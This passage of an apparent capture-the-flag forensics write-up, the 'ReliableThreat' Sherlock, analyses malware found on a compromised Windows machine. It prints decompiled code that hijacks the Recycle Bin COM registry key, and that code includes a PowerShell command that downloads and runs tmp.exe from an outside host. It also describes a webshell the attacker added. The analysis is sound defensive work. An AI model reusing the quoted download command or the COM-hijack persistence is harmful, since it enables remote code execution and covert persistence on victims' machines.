+<span class="w">  </span><span class="nx">ulonglong</span><span class="w"> </span><span class="o">*</span><span class="nx">puVar9</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">ulonglong</span><span class="w"> </span><span class="nx">uVar10</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">longlong</span><span class="w"> </span><span class="nx">lVar11</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">code</span><span class="w"> </span><span class="o">*</span><span class="nx">unaff_retaddr</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">char</span><span class="w"> </span><span class="nx">acStack_1a8</span><span class="w"> </span><span class="p">[</span><span class="mi">424</span><span class="p">];</span>
+
+<span class="w">  </span><span class="nx">acStack_1a8</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;\</span><span class="nx">x02</span><span class="err">&#39;</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">acStack_1a8</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">acStack_1a8</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="sc">&#39;I&#39;</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">acStack_1a8</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="o">-</span><span class="mh">0x5a</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">acStack_1a8</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;\</span><span class="nx">x12</span><span class="err">&#39;</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">acStack_1a8</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="o">-</span><span class="mh">0x3b</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">acStack_1a8</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="o">-</span><span class="mh">0x11</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">acStack_1a8</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;\</span><span class="nx">x05</span><span class="err">&#39;</span><span class="p">;</span>
+<span class="w">  </span><span class="p">(</span><span class="o">*</span><span class="nx">unaff_retaddr</span><span class="p">)(</span><span class="o">&amp;</span><span class="nx">stack0x00000000</span><span class="p">);</span>
+<span class="w">  </span><span class="nx">lVar3</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="nx">unaff_retaddr</span><span class="p">)(</span><span class="mh">0x101</span><span class="p">,</span><span class="nx">acStack_1a8</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">  </span><span class="nx">lVar11</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">10</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">puVar8</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">(</span><span class="nx">ulonglong</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="nx">acStack_1a8</span><span class="p">;</span>
+<span class="w">  </span><span class="nx">do</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">puVar8</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">lVar3</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">puVar8</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">lVar3</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">puVar8</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0x14000413b</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">uVar4</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="nx">unaff_retaddr</span><span class="p">)(</span><span class="nx">lVar3</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="nx">lVar3</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">do</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nx">puVar8</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0x10</span><span class="p">;</span>
+<span class="w">      </span><span class="nx">uVar1</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">puVar8</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">];</span>
+<span class="w">      </span><span class="nx">puVar8</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0x140004150</span><span class="p">;</span>
+<span class="w">      </span><span class="nx">uVar5</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">uVar4</span><span class="p">;</span>
+<span class="w">      </span><span class="nx">pcVar6</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">acStack_1a8</span><span class="p">;</span>
+<span class="w">      </span><span class="nx">iVar2</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="nx">unaff_retaddr</span><span class="p">)(</span><span class="nx">uVar4</span><span class="p">,</span><span class="nx">acStack_1a8</span><span class="p">,</span><span class="nx">uVar1</span><span class="p">);</span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">iVar2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="nx">goto</span><span class="w"> </span><span class="nx">LAB_14000415e</span><span class="p">;</span>
+<span class="w">      </span><span class="nx">lVar11</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">lVar11</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nx">lVar11</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">puVar8</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0x14000415e</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">FUN_1400041f1</span><span class="p">(</span><span class="nx">uVar5</span><span class="p">,</span><span class="nx">pcVar6</span><span class="p">);</span>
+<span class="nx">LAB_14000415e</span><span class="p">:</span>
+<span class="w">    </span><span class="nx">puVar9</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">puVar8</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="o">-</span><span class="mi">4</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">puVar8</span><span class="p">[</span><span class="o">-</span><span class="mi">5</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">puVar8</span><span class="p">[</span><span class="o">-</span><span class="mi">5</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0x140004177</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">iVar2</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="nx">unaff_retaddr</span><span class="p">)(</span><span class="nx">uVar4</span><span class="p">,</span><span class="nx">puVar8</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="o">-</span><span class="mi">4</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="w"> </span><span class="p">&lt;</span><span class="w"> </span><span class="nx">iVar2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nx">uVar10</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="o">*</span><span class="nx">puVar8</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xffffffff</span><span class="p">;</span>
+<span class="w">      </span><span class="o">*</span><span class="nx">puVar8</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0x40</span><span class="p">;</span>
+<span class="w">      </span><span class="o">*</span><span class="nx">puVar8</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">;</span>
+<span class="w">      </span><span class="nx">uVar1</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="o">*</span><span class="nx">puVar8</span><span class="p">;</span>
+<span class="w">      </span><span class="o">*</span><span class="nx">puVar8</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0x14000419c</span><span class="p">;</span>
+<span class="w">      </span><span class="nx">UNRECOVERED_JUMPTABLE</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">(</span><span class="nx">code</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="nx">unaff_retaddr</span><span class="p">)(</span><span class="mi">0</span><span class="p">,</span><span class="nx">uVar10</span><span class="p">,</span><span class="nx">uVar1</span><span class="p">);</span>
+<span class="w">      </span><span class="nx">pcVar7</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">UNRECOVERED_JUMPTABLE</span><span class="p">;</span>
+<span class="w">      </span><span class="k">while</span><span class="p">(</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="o">*</span><span class="nx">puVar8</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0x1400041b6</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">lVar3</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="nx">unaff_retaddr</span><span class="p">)(</span><span class="nx">uVar4</span><span class="p">,</span><span class="nx">pcVar7</span><span class="p">,</span><span class="nx">uVar10</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="nx">int</span><span class="p">)</span><span class="nx">lVar3</span><span class="w"> </span><span class="p">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">pcVar7</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">pcVar7</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">lVar3</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">uVar10</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">uVar10</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">lVar3</span><span class="p">;</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">uVar10</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="cm">/* WARNING: Could not recover jumptable at 0x0001400041ee. Too many branches */</span>
+<span class="w">                    </span><span class="cm">/* WARNING: Treating indirect jump as call */</span>
+<span class="w">          </span><span class="p">(</span><span class="o">*</span><span class="nx">UNRECOVERED_JUMPTABLE</span><span class="p">)();</span>
+<span class="w">          </span><span class="k">return</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">      </span><span class="nx">puVar9</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">puVar8</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+<span class="w">      </span><span class="nx">puVar8</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">(</span><span class="nx">ulonglong</span><span class="p">)</span><span class="nx">UNRECOVERED_JUMPTABLE</span><span class="p">;</span>
+<span class="w">      </span><span class="nx">uVar1</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">puVar8</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+<span class="w">      </span><span class="nx">puVar8</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0x4000</span><span class="p">;</span>
+<span class="w">      </span><span class="nx">puVar8</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">      </span><span class="nx">uVar5</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">puVar8</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+<span class="w">      </span><span class="nx">puVar8</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0x1400041d1</span><span class="p">;</span>
+<span class="w">      </span><span class="p">(</span><span class="o">*</span><span class="nx">unaff_retaddr</span><span class="p">)(</span><span class="nx">uVar1</span><span class="p">,</span><span class="nx">uVar5</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="nx">undefined8</span><span class="w"> </span><span class="o">*</span><span class="p">)((</span><span class="nx">longlong</span><span class="p">)</span><span class="nx">puVar9</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">uVar4</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">uVar4</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="nx">undefined8</span><span class="w"> </span><span class="o">*</span><span class="p">)((</span><span class="nx">longlong</span><span class="p">)</span><span class="nx">puVar9</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="o">-</span><span class="mi">8</span><span class="p">);</span>
+<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="nx">undefined8</span><span class="w"> </span><span class="o">*</span><span class="p">)((</span><span class="nx">longlong</span><span class="p">)</span><span class="nx">puVar9</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0x1400041db</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">lVar3</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="nx">unaff_retaddr</span><span class="p">)(</span><span class="nx">uVar4</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">lVar11</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">lVar11</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">puVar8</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">puVar9</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="p">(</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Meanwhile, the <code>40d6</code> function serves as a stager that initiates a socket connection to a remote server, downloads a second-stage payload, and then executes it in memory. It uses the <code>main</code> function as an API resolver to find the modules necessary for this process.</p>
+<p>While this is all very interesting to me(I made lots of notes), there is nothing mentioned about the registry and registry operations. It could be that registry modification was carried out by the payload downloaded by this malware.</p>
+<p>I have not touched the .ad1 file at all until now. It would be the perfect time to take a look at what's stored there. I will be using FTK imager to parse that file, so I'll move to a windows machine for the last 3 tasks.</p>
+<p><img alt="tempfile" src="../images/ReliableThreat/tempfile.png" /></p>
+<p>This <code>temp.exe</code> file looks very suspicious. If I remember correctly, this is the same directory from which the RuntimeBroker.exe malware was run by the Code.exe process.</p>
+<p>I'll get this file onto my windows machine, and I'll use IDA to analyze it. The file can be extracted via FTK imager by right-clicking and choosing <code>export file</code>.</p>
+<div class="codehilite"><pre><span></span><code><span class="nb nb-Type">int</span><span class="w"> </span><span class="n">__fastcall</span><span class="w"> </span><span class="n">main</span><span class="p">(</span><span class="nb nb-Type">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="nb">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="nb">char</span><span class="w"> </span><span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">DWORD</span><span class="w"> </span><span class="n">v3</span><span class="p">;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">eax</span>
+<span class="w">  </span><span class="n">HKEY</span><span class="w"> </span><span class="n">v5</span><span class="p">;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">58</span><span class="n">h</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">28</span><span class="n">h</span><span class="p">]</span><span class="w"> </span><span class="n">BYREF</span>
+<span class="w">  </span><span class="n">HKEY</span><span class="w"> </span><span class="n">hKey</span><span class="p">;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">60</span><span class="n">h</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">20</span><span class="n">h</span><span class="p">]</span><span class="w"> </span><span class="n">BYREF</span>
+<span class="w">  </span><span class="n">LSTATUS</span><span class="w"> </span><span class="n">v7</span><span class="p">;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">6</span><span class="n">Ch</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">14</span><span class="n">h</span><span class="p">]</span>
+<span class="w">  </span><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="n">Str</span><span class="p">;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">70</span><span class="n">h</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span>
+<span class="w">  </span><span class="n">LPCSTR</span><span class="w"> </span><span class="n">lpSubKey</span><span class="p">;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">78</span><span class="n">h</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span>
+
+<span class="w">  </span><span class="n">_main</span><span class="p">();</span>
+<span class="w">  </span><span class="n">hKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">LL</span><span class="p">;</span>
+<span class="w">  </span><span class="n">v5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">LL</span><span class="p">;</span>
+<span class="w">  </span><span class="n">lpSubKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;SOFTWARE</span><span class="se">\\</span><span class="s2">Classes</span><span class="se">\\</span><span class="s2">CLSID</span><span class="se">\\</span><span class="s2">{645FF040-5081-101B-9F08-00AA002F954E}</span><span class="se">\\</span><span class="s2">shell&quot;</span><span class="p">;</span>
+<span class="w">  </span><span class="n">Str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">System32</span><span class="se">\\</span><span class="s2">WindowsPowerShell</span><span class="se">\\</span><span class="s2">v1.0</span><span class="se">\\</span><span class="s2">Powershell.exe -ExecutionPolicy Bypass -Command </span><span class="se">\&quot;</span><span class="s2">(New-Object Ne&quot;</span>
+<span class="w">        </span><span class="s2">&quot;t.WebClient).DownloadFile(&#39;http://s1rx.xyz/tmp.exe&#39;, &#39;C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Temp</span><span class="se">\\</span><span class="s2">tmp.exe&#39;); Start-Process &#39;C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">&quot;</span>
+<span class="w">        </span><span class="s2">&quot;Temp</span><span class="se">\\</span><span class="s2">tmp.exe&#39;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="w">  </span><span class="n">v7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RegOpenKeyExA</span><span class="p">(</span>
+<span class="w">         </span><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">,</span>
+<span class="w">         </span><span class="s2">&quot;SOFTWARE</span><span class="se">\\</span><span class="s2">Classes</span><span class="se">\\</span><span class="s2">CLSID</span><span class="se">\\</span><span class="s2">{645FF040-5081-101B-9F08-00AA002F954E}</span><span class="se">\\</span><span class="s2">shell&quot;</span><span class="p">,</span>
+<span class="w">         </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">         </span><span class="mh">0x20006</span><span class="n">u</span><span class="p">,</span>
+<span class="w">         </span><span class="o">&amp;</span><span class="n">hKey</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">v7</span><span class="w"> </span><span class="p">)</span>
+<span class="w">  </span><span class="p">{</span>
+<span class="w">    </span><span class="n">v7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RegCreateKeyExA</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;open</span><span class="se">\\</span><span class="s2">command&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">LL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0xF003F</span><span class="n">u</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">LL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v5</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">LL</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">v7</span><span class="w"> </span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="n">v3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">Str</span><span class="p">);</span>
+<span class="w">      </span><span class="n">RegSetValueExA</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">LL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="n">u</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="n">BYTE</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Str</span><span class="p">,</span><span class="w"> </span><span class="n">v3</span><span class="p">);</span>
+<span class="w">      </span><span class="n">RegCloseKey</span><span class="p">(</span><span class="n">v5</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">RegCloseKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>This is where the registry operations happen. The malware creates a new <code>open/command</code> subkey under this registry key. It then sets its default value to the chained powershell command.</p>
+<p>The <code>open</code> verb is the default action performed when an object is double-clicked. This means that after the malware runs, every time the user attempts to open the program (e.g., by double-clicking the icon), the malicious code will be executed as well.</p>
+<p>Now I'll check what program this CLSID resolves to. A quick google search brings me to the correct answer.</p>
+<p><img alt="classid" src="../images/ReliableThreat/classid.png" /></p>
+<p><code>Recycle Bin</code> will be my answer to task 9.</p>
+<p><img alt="task9" src="../images/ReliableThreat/task9.png" /></p>
+<h1>Task 10</h1>
+<p>The attacker achieved persistence by modifying the registry and changing references to a COM(Component Object Model) object. This is a textbook example of a <code>COM hijacking</code> attack, which is a technique labeled as <code>T1546.015</code> in the MITRE ATT&amp;CK database.</p>
+<p><code>https://attack.mitre.org/techniques/T1546/015/</code></p>
+<p><img alt="task10" src="../images/ReliableThreat/task10.png" /></p>
+<h1>Task 11</h1>
+<p>Back in FTK imager, I saw the project directory in the <code>C:\Users\User2</code> directory, and extracted it.</p>
+<p><img alt="project" src="../images/ReliableThreat/project.png" /></p>
+<p>Each of the subfolders has a .git directory.</p>
+<p><img alt="git" src="../images/ReliableThreat/git.png" /></p>
+<p>Which means that I can use git to browse logs, look through commits, and, most importantly for this task, diff commits to look for changes made by the attacker.</p>
+<p><img alt="log" src="../images/ReliableThreat/log.png" /></p>
+<p>There are multiple commits in the laravel directory. I'll run <code>git diff</code> on the most recent commit hash.</p>
+<p><img alt="webshell" src="../images/ReliableThreat/webshell.png" /></p>
+<p>The attacker has added a webshell to the index.php file. With this piece of code added, they could execute commands on the server easily via the <code>s1</code> parameter while visiting the index page.</p>
+<p>This addition will be my answer to task 11.</p>
+<p><img alt="task11" src="../images/ReliableThreat/task11.png" /></p>
+<p>Solved!</p>
+            </div>
+            
+            <div class="toc-sidebar">
+                <h3>Contents</h3>
+                <ul id="toc-list">
+                    <!-- This will be populated by JavaScript -->
+                </ul>
+            </div>
+        </div>
+    </main>
+    
+    <!-- Mobile TOC toggle button -->
+    <button class="toc-toggle" aria-label="Toggle table of contents">
+        ≡
+    </button>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+        </div>
+    </footer>
+
+    <!-- Include the Markdown parser (not needed for static HTML) -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
+    
+    <script>
+        // Sherlock metadata for sidebar population
+        let sherlockData = {};
+        
+        // Function to initialize the application
+        async function initializeApp() {
+            try {
+                // Fetch sherlock metadata
+                const response = await fetch('../sherlocks.json');
+                if (!response.ok) {
+                    throw new Error('Failed to load sherlock metadata');
+                }
+                sherlockData = await response.json();
+                
+                // Populate the sidebar with sherlock links
+                populateSidebar();
+                
+                // Generate table of contents
+                generateTableOfContents();
+            } catch (error) {
+                console.error('Initialization error:', error);
+                showError("Failed to initialize application. Please refresh and try again.");
+            }
+        }
+
+        // Call the initialization function when the page loads
+        document.addEventListener('DOMContentLoaded', initializeApp);
+
+        // Populate sidebar with sherlock links dynamically
+        function populateSidebar() {
+            const categories = {
+                "veasy": document.getElementById("veasy-sherlocks"),
+                "easy": document.getElementById("easy-sherlocks"),
+                "medium": document.getElementById("medium-sherlocks"),
+                "hard": document.getElementById("hard-sherlocks"),
+                "insane": document.getElementById("insane-sherlocks")
+            };
+
+            // Clear existing links
+            for (const category of Object.values(categories)) {
+                category.innerHTML = '';
+            }
+
+            // Add sherlock links to appropriate categories
+            for (const [sherlockName, data] of Object.entries(sherlockData)) {
+                const difficulty = data.difficulty.toLowerCase();
+                if (categories[difficulty]) {
+                    const link = document.createElement('a');
+                    link.href = `../sherlocks/${sherlockName}.html`;
+                    link.textContent = data.title;
+                    
+                    // Highlight current sherlock
+                    if (data.title === "ReliableThreat") {
+                        link.classList.add('active');
+                    }
+                    
+                    categories[difficulty].appendChild(link);
+                }
+            }
+        }
+
+        // Generate table of contents from headings
+        function generateTableOfContents() {
+            const writeupBody = document.querySelector('.writeup-body');
+            const tocList = document.getElementById('toc-list');
+            const headings = writeupBody.querySelectorAll('h1, h2, h3');
+            
+            // Clear existing TOC
+            tocList.innerHTML = '';
+            
+            headings.forEach((heading, index) => {
+                // Create an ID for the heading if it doesn't have one
+                if (!heading.id) {
+                    // Convert heading text to kebab-case for ID
+                    const headingText = heading.textContent.trim();
+                    const headingId = headingText
+                        .toLowerCase()
+                        .replace(/[^\w\s-]/g, '')
+                        .replace(/\s+/g, '-');
+                    
+                    heading.id = headingId || `section-${index}`;
+                }
+                
+                // Create a list item for the TOC
+                const listItem = document.createElement('li');
+                const link = document.createElement('a');
+                link.href = `#${heading.id}`;
+                link.textContent = heading.textContent;
+                
+                // Add a class for h2 elements to create indentation
+                if (heading.tagName === 'H2') {
+                    listItem.classList.add('sub-heading');
+                    listItem.style.paddingLeft = '15px';
+                } else if (heading.tagName === 'H3') {
+                    listItem.classList.add('sub-sub-heading');
+                    listItem.style.paddingLeft = '30px';
+                }
+                
+                listItem.appendChild(link);
